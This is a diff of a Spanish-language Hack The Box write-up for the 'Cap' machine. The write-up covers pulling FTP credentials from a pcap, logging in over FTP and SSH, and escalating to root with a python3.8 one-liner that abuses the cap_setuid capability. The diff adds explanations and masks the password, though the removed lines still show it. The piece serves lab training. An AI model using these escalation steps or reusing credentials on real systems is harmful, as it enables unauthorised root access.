@@ -7,7 +7,7 @@ platform: htb
 difficulty: easy
 os: linux
 hints: [PCAP analysis, Hardcoded credentials, Capabilities]
-tags: [hackthebox, linux, http, pcap, hardcoded-credentials, ftp, ssh, CWE-798, capabilities, CWE-274]
+tags: [hackthebox, linux, http, pcap, hardcoded-credentials, ftp, ssh, capabilities]
 parent: writeups/hackthebox/machines
 ---
 
@@ -62,9 +62,9 @@ El servicio http `http://10.129.4.66/` muestra un dashboard de seguridad
 
 ![HTTP Service](/src/images/hackthebox/cap/http-service.webp)
 
-La URL `http://10.129.4.66/data/1` permite descargar un archivo `1.pcap` que contiene tráfico de red.
+La opción `Security Snapshot (5 Second PCAP + Analysis)` redirige a `http://10.129.4.66/data/1` permitiendo descargar un archivo `1.pcap` que contiene tráfico de red.
 
-Fuzzear para encontrar más archivos
+Fuzzear para encontrar más archivos `.pcap` disponibles en el servidor
 
 ![HTTP Data](/src/images/hackthebox/cap/http-data.webp)
 
@@ -139,13 +139,15 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Fi
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
 USER nathan
 331 Please specify the password.
-PASS Buck3tH4TF0RM3!
+PASS Bu***********3!
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
 ```
 
-Encontramos credenciales para el servicio FTP `nathan:Buck3tH4TF0RM3!`
+Encontramos credenciales `nathan:Bu***********3!`
 
 ## Exploitation
+
+Probar las credenciales encontradas para acceder al servicio FTP
 
 ```bash
 ftp 10.129.4.66
@@ -181,11 +183,13 @@ ftp> quit
 
 ## Privilege Escalation
 
+Probar las credenciales encontradas para acceder al servicio SSH
+
 ```bash
 ssh nathan@10.129.4.66
 ```
 
-Buscar capabilities del kernel asignadas a archivos ejecutables en todo el sistema
+Dentro del servidor buscar capabilities del kernel asignadas a archivos ejecutables en todo el sistema
 
 ```bash
 getcap -r / 2>/dev/null
@@ -205,6 +209,8 @@ La capability `cap_setuid` permite que el binario `/usr/bin/python3.8` manipule 
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
+Verificar que el usuario actual es `root`
+
 ```bash
 id
 ```
@@ -212,6 +218,8 @@ id
 ```plaintext
 uid=0(root) gid=1001(nathan) groups=1001(nathan)
 ```
+
+Obtener la flag de `root`
 
 ```bash
 cd /root
